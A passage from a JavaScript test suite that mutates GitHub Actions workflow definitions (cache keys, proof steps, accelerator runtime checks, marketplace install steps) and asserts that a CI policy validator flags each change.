    ["source-proof fallback", job => {
      const step = draftStep(job, "Restore Cargo inputs and output");
      step.with["restore-keys"] = step.with["restore-keys"].replace("-retrieval-contracts-", "-source-proof-");
    }],
    ["manifest-free prior retrieval fallback", job => {
      const step = draftStep(job, "Restore Cargo inputs and output");
      const keys = step.with["restore-keys"].trim().split("\n");
      keys[2] = keys[2].replace(`${cacheManifestIdentity}-`, "");
      step.with["restore-keys"] = keys.join("\n");
    }],
    ["target-free prior draft fallback", job => {
      const step = draftStep(job, "Restore Cargo inputs and output");
      const keys = step.with["restore-keys"].trim().split("\n");
      keys[1] = keys[1].replace("-${{ steps.rust-cache-key.outputs.target }}-", "-");
      step.with["restore-keys"] = keys.join("\n");
    }],
    ["different restore path", job => {
      const step = draftStep(job, "Restore Cargo inputs and output");
      step.with.path = step.with.path.replace("target", "target/release");
    }],
    ["blocking restore", job => {
      draftStep(job, "Restore Cargo inputs and output")["continue-on-error"] = false;
    }],
    ["matched-key save", job => {
      draftStep(job, "Save Cargo inputs and output").with.key = "${{ steps.cargo-cache-restore.outputs.cache-matched-key }}";
    }],
    ["promotion before complete proof", job => {
      draftStep(job, "Save Cargo inputs and output").if = "steps.cargo-cache-restore.outputs.cache-hit != 'true'";
    }],
    ["removed proof command", job => {
      const step = draftStep(job, "Prove focused publication contracts");
      step.run = step.run.trim().split("\n").slice(0, -1).join("\n");
    }],
    ["reordered proof commands", job => {
      const step = draftStep(job, "Prove focused publication contracts");
      const commands = step.run.trim().split("\n");
      [commands[0], commands[1]] = [commands[1], commands[0]];
      step.run = commands.join("\n");
    }],
    ["backgrounded Cargo command", job => {
      const step = draftStep(job, "Check the workspace");
      step.run = `${step.run} &`;
    }],
    ["parallel Cargo commands", job => {
      const step = draftStep(job, "Check the workspace");
      step.run = `${step.run} &\nwait`;
    }],
    ["reordered proof steps", job => {
      const left = job.steps.findIndex(step => step.name === "Check the workspace");
      const right = job.steps.findIndex(step => step.name === "Lint workspace libraries");
      [job.steps[left], job.steps[right]] = [job.steps[right], job.steps[left]];
    }],
    ["optional proof step", job => {
      draftStep(job, "Lint workspace libraries")["continue-on-error"] = true;
    }],
    ["decoy cache step", job => {
      const restore = draftStep(job, "Restore Cargo inputs and output");
      const decoy = structuredClone(restore);
      decoy.name = "Decoy cache contract";
      restore.with.key = "decoy-primary";
      job.steps.push(decoy);
    }],
  ];

  for (const [name, mutate] of mutations) {
    await t.test(name, () => {
      const candidate = draftSourceJob();
      mutate(candidate);
      assert.notDeepEqual(draftSourcePolicyViolations(candidate, retrievalSourceJob()), []);
    });
  }

  for (const [name, mutate] of [
    ["shortened producer timeout", job => {
      job["timeout-minutes"] = 30;
    }],
    ["incompatible retrieval path", job => {
      draftStep(job, "Restore Cargo registry, git sources, and build output").with.path = "~/.cargo/registry\ntarget/retrieval\n";
    }],
    ["incompatible retrieval key", job => {
      const step = draftStep(job, "Restore Cargo registry, git sources, and build output");
      step.with.key = step.with.key.replace("-default-features-", "-all-features-");
    }],
    ["mismatched retrieval topology version", job => {
      const step = draftStep(job, "Restore Cargo registry, git sources, and build output");
      step.with.key = step.with.key.replace(proofTopology, proofTopology.replace("-v1-", "-v2-"));
    }],
    ["manifest-free retrieval key", job => {
      const step = draftStep(job, "Restore Cargo registry, git sources, and build output");
      step.with.key = step.with.key.replace(`${cacheManifestIdentity}-`, "");
    }],
    ["incompatible retrieval action", job => {
      draftStep(job, "Restore Cargo registry, git sources, and build output").uses = "actions/cache/restore@v4";
    }],
    ["omitted seed target", job => {
      const step = draftStep(job, "Seed draft proof test-profile artifacts");
      step.run = step.run.trim().split("\n").slice(1).join("\n");
    }],
    ["reordered seed targets", job => {
      const step = draftStep(job, "Seed draft proof test-profile artifacts");
      const commands = step.run.trim().split("\n");
      [commands[0], commands[1]] = [commands[1], commands[0]];
      step.run = commands.join("\n");
    }],
    ["executable seed target", job => {
      const step = draftStep(job, "Seed draft proof test-profile artifacts");
      step.run = step.run.replace(" --no-run", "");
    }],
    ["optional seed step", job => {
      draftStep(job, "Seed draft proof test-profile artifacts")["continue-on-error"] = true;
    }],
    ["save before seed", job => {
      const seed = job.steps.findIndex(step => step.name === "Seed draft proof test-profile artifacts");
      const save = job.steps.findIndex(step => step.name === "Save Cargo registry, git sources, and build output");
      [job.steps[seed], job.steps[save]] = [job.steps[save], job.steps[seed]];
    }],
    ["producer matched-key save", job => {
      draftStep(job, "Save Cargo registry, git sources, and build output").with.key = "${{ steps.cargo-cache-restore.outputs.cache-matched-key }}";
    }],
  ]) {
    await t.test(name, () => {
      const candidate = retrievalSourceJob();
      mutate(candidate);
      assert.notDeepEqual(draftSourcePolicyViolations(draftSourceJob(), candidate), []);
    });
  }
});

test("retrieval cache producer triggers cover every draft manifest consumer", async (t) => {
  assert.deepEqual(retrievalProducerTriggerPolicyViolations(retrievalSourceWorkflow()), []);

  const reordered = retrievalSourceWorkflow();
  reordered.on.pull_request.paths.reverse();
  reordered.on.push.paths.reverse();
  assert.deepEqual(
    retrievalProducerTriggerPolicyViolations(reordered),
    [],
    "required trigger membership is order-insensitive",
  );

  const requiredPaths = [
    "crates/**/Cargo.toml",
    "vendor/**/Cargo.toml",
    ".github/workflows/rust-ci.yml",
    "scripts/lint-retrieval-generalization.mjs",
    "scripts/lib/retrieval-generalization-lint.mjs",
    "scripts/tests/lint-retrieval-generalization.test.mjs",
  ];
  for (const event of ["pull_request", "push"]) {
    for (const requiredPath of requiredPaths) {
      await t.test(`${event} rejects removal of ${requiredPath}`, () => {
        const candidate = retrievalSourceWorkflow();
        candidate.on[event].paths = candidate.on[event].paths
          .filter(triggerPath => triggerPath !== requiredPath);
        assert.notDeepEqual(retrievalProducerTriggerPolicyViolations(candidate), []);
        const workflows = loadWorkflows();
        workflows.set(retrievalFile, candidate);
        assert.match(
          validateWorkflows(workflows).join("\n"),
          /retrieval cache producer .* paths must cover/u,
        );
      });
    }
  }

  await t.test("push must retain the dev branch", () => {
    const candidate = retrievalSourceWorkflow();
    candidate.on.push.branches = candidate.on.push.branches
      .filter(branch => branch !== "dev/codestory-next");
    assert.notDeepEqual(retrievalProducerTriggerPolicyViolations(candidate), []);
    const workflows = loadWorkflows();
    workflows.set(retrievalFile, candidate);
    assert.match(
      validateWorkflows(workflows).join("\n"),
      /retrieval cache producer must run on dev\/codestory-next pushes/u,
    );
  });
});

test("retrieval smoke keeps the one-process generalization lane blocking", async (t) => {
  assert.deepEqual(windowsManifestProofPolicyViolations(retrievalSourceWorkflow()), []);

  const mutations = [
    ["wrong Node version", workflow => {
      workflow.jobs["linux-contracts"].steps
        .find(({ uses }) => uses === "actions/setup-node@v5")
        .with["node-version"] = "22";
    }, /must use blocking Node 24/u],
    ["production smoke removed", workflow => {
      workflow.jobs["linux-contracts"].steps = workflow.jobs["linux-contracts"].steps
        .filter(({ name }) => name !== "Generalization lint (production paths)");
    }, /production paths.*exact blocking Node command/u],
    ["hostile matrix replaced", workflow => {
      draftStep(
        workflow.jobs["linux-contracts"],
        "Generalization lint hostile matrix",
      ).run = "node --test scripts/tests/something-else.test.mjs";
    }, /hostile matrix.*exact blocking Node command/u],
    ["hostile matrix made optional", workflow => {
      draftStep(
        workflow.jobs["linux-contracts"],
        "Generalization lint hostile matrix",
      )["continue-on-error"] = true;
    }, /hostile matrix.*exact blocking Node command/u],
    ["serialized Rust wrapper restored", workflow => {
      workflow.jobs["linux-contracts"].steps.push({
        name: "Legacy generalization wrapper",
        run: "cargo test --locked -p codestory-runtime --test retrieval_generalization_guard",
      });
    }, /must not restore the serialized Rust subprocess wrapper/u],
  ];

  for (const [name, mutate, expectedReason] of mutations) {
    await t.test(name, () => {
      const candidate = retrievalSourceWorkflow();
      mutate(candidate);
      const violations = windowsManifestProofPolicyViolations(candidate);
      assert.match(violations.join("\n"), expectedReason);
      const workflows = loadWorkflows();
      workflows.set(retrievalFile, candidate);
      assert.match(validateWorkflows(workflows).join("\n"), expectedReason);
    });
  }
});

test("Windows manifest-missing proof freezes routing, native topology, and exact cache identity", async (t) => {
  assert.deepEqual(windowsManifestProofPolicyViolations(windowsManifestWorkflow()), []);

  const keyStep = workflow => windowsManifestStep(
    workflow,
    "Restore Windows Cargo inputs and output",
  );
  const proofStep = workflow => windowsManifestStep(
    workflow,
    "Prove Windows ready_command manifest-missing contract",
  );
  const saveStep = workflow => windowsManifestStep(
    workflow,
    "Save Windows Cargo inputs and output",
  );
  const installerHash = "${{ hashFiles('.github/scripts/install-windows-vulkan-sdk.ps1') }}";
  const lockHash = "${{ hashFiles('Cargo.lock') }}";

  const mutations = [
    ["cloned Windows job routed on pull requests", workflow => {
      const clone = structuredClone(windowsManifestJob(workflow));
      clone.if = "github.event_name == 'pull_request'";
      clone["continue-on-error"] = true;
      workflow.jobs["windows-manifest-decoy"] = clone;
    }, /must contain exactly linux-contracts and windows-manifest-missing jobs/u],
    ["top-level build target", workflow => {
      workflow.env = { CARGO_BUILD_TARGET: "x86_64-pc-windows-gnu" };
    }, /must not define top-level env/u],
    ["top-level shell default", workflow => {
      workflow.defaults = { run: { shell: "bash" } };
    }, /must not define top-level defaults/u],
    ["top-level working-directory default", workflow => {
      workflow.defaults = { run: { "working-directory": "crates/codestory-cli" } };
    }, /must not define top-level defaults/u],
    ["pull request omits installer", workflow => {
      workflow.on.pull_request.paths = workflow.on.pull_request.paths
        .filter(triggerPath => triggerPath !== ".github/scripts/install-windows-vulkan-sdk.ps1");
    }],
    ["push omits installer", workflow => {
      workflow.on.push.paths = workflow.on.push.paths
        .filter(triggerPath => triggerPath !== ".github/scripts/install-windows-vulkan-sdk.ps1");
    }],
    ["dispatch inputs", workflow => {
      workflow.on.workflow_dispatch = { inputs: { ref: { required: false, type: "string" } } };
    }],
    ["pull-request job routing", workflow => {
      windowsManifestJob(workflow).if = "github.event_name == 'pull_request'";
    }],
    ["label routing", workflow => {
      windowsManifestJob(workflow).if = "contains(github.event.pull_request.labels.*.name, 'proof')";
    }],
    ["older runner", workflow => {
      windowsManifestJob(workflow)["runs-on"] = "windows-2022";
    }],
    ["longer timeout", workflow => {
      windowsManifestJob(workflow)["timeout-minutes"] = 60;
    }],
    ["CPU permission removed", workflow => {
      delete windowsManifestJob(workflow).env.CODESTORY_TEST_EMBED_ALLOW_CPU;
    }],
    ["CPU permission disabled", workflow => {
      windowsManifestJob(workflow).env.CODESTORY_TEST_EMBED_ALLOW_CPU = "0";
    }],
    ["native generator removed", workflow => {
      delete windowsManifestJob(workflow).env.CMAKE_GENERATOR;
    }],
    ["native generator changed to Visual Studio", workflow => {
      windowsManifestJob(workflow).env.CMAKE_GENERATOR = "Visual Studio 18 2026";
    }],
    ["native generator moved to proof-step override", workflow => {
      delete windowsManifestJob(workflow).env.CMAKE_GENERATOR;
      proofStep(workflow).env = { CMAKE_GENERATOR: "Ninja" };
    }],
    ["extra product feature environment", workflow => {
      windowsManifestJob(workflow).env.CARGO_FEATURES = "cpu-only";
    }],
    ["job made optional", workflow => {
      windowsManifestJob(workflow)["continue-on-error"] = true;
    }],
    ["checkout alternate ref", workflow => {
      windowsManifestJob(workflow).steps[0].with = { ref: "main" };
    }],
    ["installer removed", workflow => {
      windowsManifestJob(workflow).steps = windowsManifestJob(workflow).steps
        .filter(step => step.name !== "Install checksum-pinned Windows Vulkan SDK");
    }],
    ["installer replaced", workflow => {
      windowsManifestStep(workflow, "Install checksum-pinned Windows Vulkan SDK").run = "choco install vulkan-sdk";
    }],
    ["installer made optional", workflow => {
      windowsManifestStep(workflow, "Install checksum-pinned Windows Vulkan SDK")["continue-on-error"] = true;
    }],
    ["installer moved after proof", workflow => {
      const job = windowsManifestJob(workflow);
      const installer = job.steps.findIndex(step => step.name === "Install checksum-pinned Windows Vulkan SDK");
      const proof = job.steps.findIndex(step => step.name === "Prove Windows ready_command manifest-missing contract");
      [job.steps[installer], job.steps[proof]] = [job.steps[proof], job.steps[installer]];
    }],
    ["CMake cache identity capture removed", workflow => {
      const identity = windowsManifestStep(workflow, "Capture Rust cache identity");
      identity.run = identity.run.replace(/.*cmake.*\n/gu, "");
    }],
    ["Ninja cache identity capture removed", workflow => {
      const identity = windowsManifestStep(workflow, "Capture Rust cache identity");
      identity.run = identity.run.replace(/.*ninja.*\n/gu, "");
    }],
    ["unversioned proof topology", workflow => {
      keyStep(workflow).with.key = keyStep(workflow).with.key
        .replace(/ready-command-v2-[0-9a-f]{64}/u, "ready-command");
    }],
    ["stale proof topology", workflow => {
      keyStep(workflow).with.key = keyStep(workflow).with.key
        .replace("ready-command-v2-", "ready-command-v1-");
    }],
    ["generator-free cache", workflow => {
      keyStep(workflow).with.key = keyStep(workflow).with.key
        .replace("-generator-ninja", "");
    }],
    ["CMake-free cache", workflow => {
      keyStep(workflow).with.key = keyStep(workflow).with.key
        .replace("-cmake-${{ steps.rust-cache-key.outputs.cmake }}", "");
    }],
    ["Ninja-free cache", workflow => {
      keyStep(workflow).with.key = keyStep(workflow).with.key
        .replace("-ninja-${{ steps.rust-cache-key.outputs.ninja }}", "");
    }],
    ["OS-free cache", workflow => {
      keyStep(workflow).with.key = keyStep(workflow).with.key.replace("${{ runner.os }}-", "");
    }],
    ["Rust-free cache", workflow => {
      keyStep(workflow).with.key = keyStep(workflow).with.key
        .replace("-${{ steps.rust-cache-key.outputs.version }}", "");
    }],
    ["target-free cache", workflow => {
      keyStep(workflow).with.key = keyStep(workflow).with.key
        .replace("-${{ steps.rust-cache-key.outputs.target }}", "");
    }],
    ["all-feature cache", workflow => {
      keyStep(workflow).with.key = keyStep(workflow).with.key
        .replace("-default-features-", "-all-features-");
    }],
    ["manifest-free cache", workflow => {
      keyStep(workflow).with.key = keyStep(workflow).with.key
        .replace(`${cacheManifestIdentity}-`, "");
    }],
    ["installer-free cache", workflow => {
      keyStep(workflow).with.key = keyStep(workflow).with.key.replace(`${installerHash}-`, "");
    }],
    ["lock-free cache", workflow => {
      keyStep(workflow).with.key = keyStep(workflow).with.key.replace(lockHash, "unlocked");
    }],
    ["fallback cache prefix", workflow => {
      keyStep(workflow).with["restore-keys"] = "Windows-cargo-stable-";
    }],
    ["alternate cache output", workflow => {
      keyStep(workflow).with.path = "target/windows";
    }],
    ["cache restore bypass", workflow => {
      keyStep(workflow).if = "always()";
    }],
    ["unlocked proof", workflow => {
      proofStep(workflow).run = proofStep(workflow).run.replace(" --locked", "");
    }],
    ["supplied-binary substitute", workflow => {
      proofStep(workflow).run = "cargo test --locked -p codestory-cli --test ready_command --features supplied-binary";
    }],
    ["proof made optional", workflow => {
      proofStep(workflow)["continue-on-error"] = true;
    }],
    ["save before proof", workflow => {
      const job = windowsManifestJob(workflow);
      const proof = job.steps.findIndex(step => step.name === "Prove Windows ready_command manifest-missing contract");
      const save = job.steps.findIndex(step => step.name === "Save Windows Cargo inputs and output");
      [job.steps[proof], job.steps[save]] = [job.steps[save], job.steps[proof]];
    }],
    ["save after failed proof", workflow => {
      saveStep(workflow).if = "steps.cargo-cache-restore.outputs.cache-hit != 'true'";
    }],
    ["save exact hit", workflow => {
      saveStep(workflow).if = "success()";
    }],
    ["save matched key", workflow => {
      saveStep(workflow).with.key = "${{ steps.cargo-cache-restore.outputs.cache-matched-key }}";
    }],
    ["save fallback input", workflow => {
      saveStep(workflow).with["restore-keys"] = "Windows-cargo-stable-";
    }],
    ["decoy proof", workflow => {
      const decoy = structuredClone(proofStep(workflow));
      proofStep(workflow).run = "Write-Output skipped";
      decoy.name = "Decoy ready_command proof";
      windowsManifestJob(workflow).steps.push(decoy);
    }],
  ];

  for (const [name, mutate, expectedReason = /Windows manifest proof/u] of mutations) {
    await t.test(name, () => {
      const candidate = windowsManifestWorkflow();
      mutate(candidate);
      const violations = windowsManifestProofPolicyViolations(candidate);
      assert.notDeepEqual(violations, []);
      assert.match(violations.join("\n"), expectedReason);
      const workflows = loadWorkflows();
      workflows.set(retrievalFile, candidate);
      assert.match(
        validateWorkflows(workflows).join("\n"),
        expectedReason,
      );
    });
  }
});

test("Windows source package builds pin Ninja and bind native tool identity", async (t) => {
  assert.deepEqual(validateWorkflows(loadWorkflows()), []);

  const packagedFile = "packaged-platform-proof.yml";
  const protectedFile = "windows-vulkan-proof.yml";
  const packagedIdentity = workflow => draftStep(
    workflow.jobs.build,
    "Capture reusable build cache contract",
  );
  const packagedCacheSetup = workflow => draftStep(
    workflow.jobs.build,
    "Configure bounded compiler cache",
  );
  const packagedBuild = workflow => draftStep(
    workflow.jobs.build,
    "Build package and qualification driver",
  );
  const packagedShortTarget = workflow => draftStep(
    workflow.jobs.build,
    "Configure short Windows Cargo target",
  );
  const packagedNativeStaging = workflow => draftStep(
    workflow.jobs.build,
    "Test immutable native staging on Windows",
  );
  const protectedSourceTools = workflow => draftStep(
    workflow.jobs["packaged-vulkan"],
    "Capture source build tool evidence",
  );
  const protectedHost = workflow => draftStep(
    workflow.jobs["packaged-vulkan"],
    "Capture host evidence",
  );
  const protectedPython = workflow => draftStep(
    workflow.jobs["packaged-vulkan"],
    "Install pinned Python",
  );
  const protectedBuild = workflow => draftStep(
    workflow.jobs["packaged-vulkan"],
    "Build and package native CLI",
  );

  const mutations = [
    ["packaged CMake identity removed", packagedFile, workflow => {
      packagedIdentity(workflow).run = packagedIdentity(workflow).run
        .replace('--cmake-version "$cmake_version"', "--cmake ignored");
    }, /must compute one complete reusable compiler compatibility contract/u],
    ["packaged Ninja identity removed", packagedFile, workflow => {
      packagedIdentity(workflow).run = packagedIdentity(workflow).run
        .replace('--ninja-version "$ninja_version"', "--ninja ignored");
    }, /must compute one complete reusable compiler compatibility contract/u],
    ["packaged Ninja selection removed", packagedFile, workflow => {
      packagedCacheSetup(workflow).run = packagedCacheSetup(workflow).run
        .replace(/.*CMAKE_GENERATOR=Ninja.*\n/u, "");
    }, /Configure bounded compiler cache/u],
    ["packaged short Windows target made cross-platform", packagedFile, workflow => {
      packagedShortTarget(workflow).if = "runner.os != 'Windows'";
    }, /short Cargo target must be Windows-only/u],
    ["packaged short Windows target stops using a junction", packagedFile, workflow => {
      packagedShortTarget(workflow).run = packagedShortTarget(workflow).run
        .replace("New-Item -ItemType Junction", "New-Item -ItemType Directory");
    }, /Configure short Windows Cargo target/u],
    ["packaged short Windows target stops using the runner volume root", packagedFile, workflow => {
      packagedShortTarget(workflow).run = packagedShortTarget(workflow).run
        .replace("$runnerRoot = [System.IO.Path]::GetPathRoot($workspaceTarget)", "$runnerRoot = $env:RUNNER_TEMP");
    }, /Configure short Windows Cargo target/u],
    ["packaged short Windows target points at wrong storage", packagedFile, workflow => {
      packagedShortTarget(workflow).run = packagedShortTarget(workflow).run
        .replace("-Target $workspaceTarget", '-Target "wrong"');
    }, /Configure short Windows Cargo target/u],
    ["packaged short Windows target no longer exports Cargo output", packagedFile, workflow => {
      packagedShortTarget(workflow).run = packagedShortTarget(workflow).run
        .replace("| Out-File -FilePath $env:GITHUB_ENV", "| Write-Output");
    }, /Configure short Windows Cargo target/u],
    ["packaged native staging regression made cross-platform", packagedFile, workflow => {
      packagedNativeStaging(workflow).if = "runner.os != 'Windows'";
    }, /immutable native staging regression must run on Windows/u],
    ["packaged native staging regression removed", packagedFile, workflow => {
      packagedNativeStaging(workflow).run = "cargo test --release --locked";
    }, /Test immutable native staging on Windows/u],
    ["packaged build overrides generator", packagedFile, workflow => {
      packagedBuild(workflow).env = { CMAKE_GENERATOR: "Visual Studio 18 2026" };
    }, /native package build must not override the selected generator/u],
    ["packaged Windows smoke ignores short target", packagedFile, workflow => {
      draftStep(workflow.jobs.build, "Smoke codestory-cli on Windows").run
        = '$bin = "target/codestory-cli.exe"';
    }, /Smoke codestory-cli on Windows/u],
    ["packaged Windows asset ignores short target", packagedFile, workflow => {
      draftStep(workflow.jobs.build, "Package release asset on Windows").run
        = 'python .github/scripts/package-codestory-release.py --binary "target/codestory-cli.exe"';
    }, /Package release asset on Windows/u],
    ["packaged Windows asset reroutes the short-target binary", packagedFile, workflow => {
      const step = draftStep(workflow.jobs.build, "Package release asset on Windows");
      step.run = step.run.replace("--binary $bin", "--binary target/wrong.exe");
    }, /Package release asset on Windows/u],
    ["protected generator removed", protectedFile, workflow => {
      delete protectedBuild(workflow).env.CMAKE_GENERATOR;
    }, /source package build must use the Ninja native generator/u],
    ["protected generator changed", protectedFile, workflow => {
      protectedBuild(workflow).env.CMAKE_GENERATOR = "Visual Studio 18 2026";
    }, /source package build must use the Ninja native generator/u],
    ["protected build adds a second generator surface", protectedFile, workflow => {
      protectedBuild(workflow).env.CMAKE_GENERATOR_PLATFORM = "x64";
    }, /source package build must use the Ninja native generator/u],
    ["protected host omits generator selection", protectedFile, workflow => {
      protectedSourceTools(workflow).run = protectedSourceTools(workflow).run
        .replace(/.*CMAKE_GENERATOR=Ninja.*\n/u, "");
    }, /Capture source build tool evidence/u],
    ["protected host omits CMake version", protectedFile, workflow => {
      protectedSourceTools(workflow).run = protectedSourceTools(workflow).run
        .replace(/.*cmake --version.*\n/u, "");
    }, /Capture source build tool evidence/u],
    ["protected host omits Ninja version", protectedFile, workflow => {
      protectedSourceTools(workflow).run = protectedSourceTools(workflow).run
        .replace(/.*ninja --version.*\n/u, "");
    }, /Capture source build tool evidence/u],
    ["protected source evidence made unconditional", protectedFile, workflow => {
      delete protectedSourceTools(workflow).if;
    }, /source build tool evidence must remain source-only/u],
    ["protected source evidence guard inverted", protectedFile, workflow => {
      protectedSourceTools(workflow).if = "inputs.use_packaged_cli_artifact";
    }, /source build tool evidence must remain source-only/u],
    ["protected source evidence made optional", protectedFile, workflow => {
      protectedSourceTools(workflow)["continue-on-error"] = true;
    }, /source build tool evidence must remain source-only/u],
    ["protected host requires PowerShell 7", protectedFile, workflow => {
      protectedHost(workflow).shell = "pwsh";
    }, /must use built-in Windows PowerShell/u],
    ["protected Python action drifts", protectedFile, workflow => {
      protectedPython(workflow).uses = "actions/setup-python@v6";
    }, /must use actions\/setup-python@v7\.0\.0/u],
    ["protected Python version drifts", protectedFile, workflow => {
      protectedPython(workflow).with["python-version"] = "3.14";
    }, /must pin Python 3\.13/u],
    ["protected Python process policy is removed", protectedFile, workflow => {
      delete protectedPython(workflow).env;
    }, /must pin Python 3\.13 with process-scoped script policy/u],
    ["protected Python process policy drifts", protectedFile, workflow => {
      protectedPython(workflow).env.PSExecutionPolicyPreference = "RemoteSigned";
    }, /must pin Python 3\.13 with process-scoped script policy/u],
    ["protected Python becomes conditional", protectedFile, workflow => {
      protectedPython(workflow).if = "false";
    }, /must pin Python 3\.13 with process-scoped script policy/u],
    ["protected Python becomes optional", protectedFile, workflow => {
      protectedPython(workflow)["continue-on-error"] = true;
    }, /must pin Python 3\.13 with process-scoped script policy/u],
    ["protected Python moves after host scripts", protectedFile, workflow => {
      const steps = workflow.jobs["packaged-vulkan"].steps;
      const pythonIndex = steps.findIndex(step => step.name === "Install pinned Python");
      const [python] = steps.splice(pythonIndex, 1);
      steps.push(python);
    }, /pinned Python must run immediately after checkout/u],
  ];

  for (const [name, file, mutate, expectedReason] of mutations) {
    await t.test(name, () => {
      const workflows = loadWorkflows();
      mutate(workflows.get(file));
      const violations = validateWorkflows(workflows);
      assert.notDeepEqual(violations, []);
      assert.match(violations.join("\n"), expectedReason);
    });
  }
});

test("protected candidate installs prove accelerated server behavior without CPU fallback", async (t) => {
  assert.deepEqual(validateWorkflows(loadWorkflows()), []);

  const platforms = [
    {
      file: "macos-metal-proof.yml",
      job: "packaged-metal",
      proof: "Prove candidate-installed macOS Metal runtime",
      backend: "Metal",
    },
    {
      file: "windows-vulkan-proof.yml",
      job: "packaged-vulkan",
      proof: "Prove candidate-installed Windows Vulkan runtime",
      backend: "Vulkan",
    },
    {
      file: "linux-vulkan-proof.yml",
      job: "packaged-vulkan",
      proof: "Prove candidate-installed Linux Vulkan runtime",
      backend: "Vulkan",
    },
  ];

  for (const platform of platforms) {
    const mutations = [
      ["CPU fallback enabled", step => {
        step.env.CODESTORY_EMBED_ALLOW_CPU = "1";
      }],
      ["accelerated engine policy removed", step => {
        step.run = step.run.replace("--engine-policy accelerated", "--engine-policy cpu_explicit");
      }],
      ["accelerator backend replaced by CPU", step => {
        step.run = step.run.replace(`--expected-backend ${platform.backend}`, "--expected-backend CPU");
      }],
      ["server behavior reduced to a ground-only probe", step => {
        step.run = step.run.replace("--server-behavior-only", "--ground-only");
      }],
      ["installed provenance removed", step => {
        step.run = step.run.replace("--installed-plugin-attestation", "--installed-plugin-provenance");
      }],
      ["calibration is smuggled into the standard candidate proof", step => {
        step.run += "\n--calibration-bundle forged.json";
      }],
    ];

    for (const [name, mutate] of mutations) {
      await t.test(`${platform.file}: ${name}`, () => {
        const workflows = loadWorkflows();
        const workflow = workflows.get(platform.file);
        mutate(draftStep(workflow.jobs[platform.job], platform.proof));
        const violations = validateWorkflows(workflows);
        assert.notDeepEqual(violations, []);
        assert.match(violations.join("\n"), new RegExp(
          `${platform.file.replaceAll(".", "\\.")}|${platform.proof}`,
          "u",
        ));
      });
    }
  }
});

test("protected macOS package download is resumable and container-verified", async (t) => {
  assert.deepEqual(validateWorkflows(loadWorkflows()), []);

  const file = "macos-metal-proof.yml";
  const mutations = [
    ["resume removed", step => {
      step.run = step.run.replace("--continue-at -", "--remote-name");
    }, /Download packaged CLI artifact/u],
    ["container digest bypassed", step => {
      step.run = step.run.replace(
        'test "$actual_digest" = "${expected_digest#sha256:}"',
        "true",
      );
    }, /Download packaged CLI artifact/u],
    ["producer SHA binding removed", step => {
      step.run = step.run.replace(".workflow_run.head_sha == $sha", "true");
    }, /Download packaged CLI artifact/u],
  ];

  for (const [name, mutate, expectedReason] of mutations) {
    await t.test(name, () => {
      const workflows = loadWorkflows();
      const step = draftStep(
        workflows.get(file).jobs["packaged-metal"],
        "Download packaged CLI artifact",
      );
      mutate(step);
      const violations = validateWorkflows(workflows);
      assert.notDeepEqual(violations, []);
      assert.match(violations.join("\n"), expectedReason);
    });
  }
});

test("post-publish proof uses an immutable real Codex marketplace install", async (t) => {
  assert.deepEqual(validateWorkflows(loadWorkflows()), []);

  const file = "post-publish-release-smoke.yml";
  const installStep = workflow => workflow.jobs.smoke.steps.find(
    ({ name }) => name === "Resolve the published plugin through the marketplace catalog",
  );
  const proofStep = workflow => workflow.jobs.smoke.steps.find(
    ({ name }) => name === "Prove the catalog-resolved published runtime",
  );
  const mutations = [
    ["Codex CLI pin drifts", workflow => {
      workflow.env.CODEX_CLI_VERSION = "latest";
    }, /pin the Codex CLI/u],
    ["marketplace revision becomes mutable", workflow => {
      installStep(workflow).run = installStep(workflow).run
        .replace('--marketplace-revision "$marketplace_revision"', "--marketplace-revision main");
    }, /Resolve the published plugin through the marketplace catalog/u],
    ["marketplace revision is resolved again after publication", workflow => {
      installStep(workflow).run += "\ngit ls-remote origin refs/heads/main";
    }, /must not fabricate installation with git ls-remote/u],
    ["checked-out package binding is removed", workflow => {
      installStep(workflow).run = installStep(workflow).run
        .replace(
          '--source-repository "$GITHUB_WORKSPACE"',
          '--source-commit "$GITHUB_SHA"',
        );
    }, /Resolve the published plugin through the marketplace catalog/u],
    ["real installer helper is bypassed", workflow => {
      installStep(workflow).run = installStep(workflow).run
        .replace(
          "install-codestory-marketplace-proof.mjs",
          "copy-codestory-marketplace-proof.mjs",
        );
    }, /Resolve the published plugin through the marketplace catalog/u],
    ["source archive is substituted for installation", workflow => {
      installStep(workflow).run += "\ngit archive HEAD:plugins/codestory";
    }, /must not fabricate installation with git archive/u],
    ["single v2 attestation is removed", workflow => {
      proofStep(workflow).run = proofStep(workflow).run
        .replace("--installed-plugin-attestation", "--installed-plugin-provenance");
    }, /installed runtime proof must run --installed-plugin-attestation/u],
  ];

  for (const [name, mutate, expectedReason] of mutations) {
    await t.test(name, () => {
      const workflows = loadWorkflows();
      mutate(workflows.get(file));
      const violations = validateWorkflows(workflows);
      assert.notDeepEqual(violations, []);
      assert.match(violations.join("\n"), expectedReason);
    });
  }
});

test("post-publish proof keeps every release asset on its protected accelerator", async (t) => {
  assert.deepEqual(validateWorkflows(loadWorkflows()), []);

  const file = "post-publish-release-smoke.yml";
  const proof = workflow => draftStep(
    workflow.jobs.smoke,
    "Prove the catalog-resolved published runtime",
  );
  const installStep = workflow => draftStep(
    workflow.jobs.smoke,
    "Resolve the published plugin through the marketplace catalog",
  );
  const row = (workflow, assetTarget) => {
    const match = workflow.jobs.smoke.strategy.matrix.include.find(
      ({ asset_target: candidate }) => candidate === assetTarget,
    );
    assert.ok(match, `missing ${assetTarget} post-publish row`);
    return match;
  };
  const mutations = [
    ["Windows moves to a hosted runner", workflow => {
      row(workflow, "windows-x64").runs_on = '["windows-latest"]';
    }],
    ["macOS loses its protected environment", workflow => {
      row(workflow, "macos-arm64").environment = "";
    }],
    ["Linux backend falls back to CPU", workflow => {
      row(workflow, "linux-x64").backend = "CPU";
    }],
    ["matrix starts cancelling sibling platform proof", workflow => {
      workflow.jobs.smoke.strategy["fail-fast"] = true;
    }],
    ["published runtime enables CPU fallback", workflow => {
      proof(workflow).env.CODESTORY_EMBED_ALLOW_CPU = "1";
    }],
    ["published runtime drops accelerated policy", workflow => {
      proof(workflow).run = proof(workflow).run
        .replace("--engine-policy accelerated", "--engine-policy cpu_explicit");
    }],
    ["published runtime drops bounded server behavior", workflow => {
      proof(workflow).run = proof(workflow).run
        .replace("--server-behavior-only", "--ground-only");
    }],
    ["published Python loses the protected execution policy", workflow => {
      delete draftStep(workflow.jobs.smoke, "Install pinned Python")
        .env.PSExecutionPolicyPreference;
    }],
    ["published Python proof falls back to PowerShell", workflow => {
      draftStep(workflow.jobs.smoke, "Prove packaged version, help, and stdio shape").shell
        = "powershell";
    }],
    ["published marketplace install inherits personal HOME", workflow => {
      installStep(workflow).run = installStep(workflow).run
